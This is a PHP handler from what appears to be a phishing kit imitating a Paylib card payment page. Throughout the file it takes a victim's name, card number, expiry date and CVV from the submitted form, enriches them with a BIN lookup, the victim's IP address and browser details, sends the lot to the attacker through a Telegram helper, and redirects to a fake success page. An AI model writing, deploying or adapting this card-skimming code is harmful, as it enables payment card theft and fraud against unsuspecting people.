<?php

require_once '../../tlx.php';
session_start();
$ip = getenv("REMOTE_ADDR");
$link = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'] ;

$hostname = gethostbyaddr($ip);



$bin = $_POST['ccard'] ;
$bin = preg_replace('/\s/', '', $bin);
$bin = substr($bin,0,8);
$url = "https://lookup.binlist.net/".$bin;
$headers = array();
$headers[] = 'Accept-Version: 3';
$ch = curl_init();  
curl_setopt($ch,CURLOPT_URL,$url);
curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$resp=curl_exec($ch);
curl_close($ch);
$xBIN = json_decode($resp, true);

$_SESSION['bank_name'] = $xBIN["bank"]["name"];
$_SESSION['bank_scheme'] = strtoupper($xBIN["scheme"]);
$_SESSION['bank_type'] = strtoupper($xBIN["type"]);
$_SESSION['bank_brand'] = strtoupper($xBIN["brand"]);
$_SESSION['bank_country'] = $xBIN["country"]["name"];


          if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
                $ip = $_SERVER['HTTP_CLIENT_IP'];
            } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
                $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
            } else {
                $ip = $_SERVER['REMOTE_ADDR'];
            }

   
            $DAk89 .= "𝗡𝗲𝘄 𝗖𝗮𝗿𝗱 𝗣𝗮𝘆𝗹𝗶𝗯 | ".$ip."\n\n";
            $DAk89 .= "Nom/Prenom: ".$_POST['name']."\n";
            $DAk89 .= "CB: ".$_POST['ccard']."\n";
            $DAk89 .= "Exp: ".$_POST['eexp']."\n";
            $DAk89 .= "Cvv: ".$_POST['ccvv']."\n";
            $DAk89 .= "Banque : ".$_SESSION['bank_name']."\r\n";
            $DAk89 .= "Niveau : ".$_SESSION['bank_type']."\r\n";
            $DAk89 .= "Pays : ".$_SESSION['bank_country']."\r\n";
            $DAk89 .= "▬▬▬▬▬\n";
            $DAk89 .= "Browser : ".$_SERVER['HTTP_USER_AGENT']."\n\n";
            $DAk89 .= "🔥 𝘥𝘢𝘴_𝘬𝘰𝘯𝘨𝘭𝘰𝘮𝘦𝘳𝘢𝘵 🔥\n";

            

             telegram_send(urlencode($DAk89));
header("Location: ../success.php");


?>